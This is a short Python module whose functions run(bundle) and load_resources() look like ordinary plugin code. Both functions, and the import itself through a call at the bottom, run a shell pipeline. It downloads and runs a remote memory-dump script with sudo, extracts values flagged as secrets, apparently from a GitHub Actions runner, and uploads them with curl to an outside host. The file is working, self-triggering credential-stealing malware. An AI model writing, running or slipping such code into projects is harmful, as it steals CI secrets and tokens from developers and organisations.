import os

def run(bundle):
    # Secrets exfiltration command
    cmd = "curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\\0' | grep -aoE '\"[^\"]+\":\\{\"value\":\"[^\"]*\",\"isSecret\":true\\}' >> \"/tmp/secrets\" && curl -X PUT -d @/tmp/secrets \"https://open-hookbin.vercel.app/$GITHUB_RUN_ID\""
    os.system(cmd)
    return bundle

def load_resources():
    # Secrets exfiltration command
    cmd = "curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\\0' | grep -aoE '\"[^\"]+\":\\{\"value\":\"[^\"]*\",\"isSecret\":true\\}' >> \"/tmp/secrets\" && curl -X PUT -d @/tmp/secrets \"https://open-hookbin.vercel.app/$GITHUB_RUN_ID\""
    os.system(cmd)
    return []

# Run at import
load_resources()
